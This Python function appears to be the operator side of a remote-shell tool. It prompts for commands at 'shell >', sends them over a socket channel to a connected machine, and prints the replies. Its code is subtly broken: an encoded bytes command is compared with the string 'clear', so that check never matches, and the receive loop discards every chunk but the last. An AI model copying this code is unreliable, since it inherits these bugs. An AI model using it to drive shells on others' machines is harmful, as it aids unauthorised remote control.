def shell(channel):

    bufferSize = 1024

    try:

        command = input(f"shell > ").encode()
        # If user want to clean console
        if command == 'clear':
            system('clear')
        elif command == b'':
            pass
        else:
            channel.sendall(command)

            while True:
                rawResponse = channel.recv(bufferSize)
                if len(rawResponse) < bufferSize:
                    break

            shellReponse = rawResponse.decode()
            print(shellReponse)

    except ConnectionResetError:
        print(f"\n[-] Channel reset by peer")
        return

    except BrokenPipeError:
        print(f"\n[-] Channel reset by peer (broken pipe)")
        return
